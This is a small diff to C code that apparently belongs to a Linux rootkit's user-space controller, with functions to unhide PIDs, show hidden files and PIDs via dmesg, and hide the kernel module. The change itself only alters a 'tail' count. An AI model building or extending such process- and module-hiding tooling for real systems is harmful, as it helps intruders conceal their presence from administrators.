@@ -77,7 +77,7 @@ void unhide_pid(int fd){
 void see_hidden(int fd){
 	send_msg_id(5, fd);
 	printf("Hidden files and PIDs shown in dmesg:\n");
-	system("dmesg | tail -1"); //could there be a race condition?
+	system("dmesg | tail -2"); //could there be a race condition?
 }
 
 void hide_module(int fd){
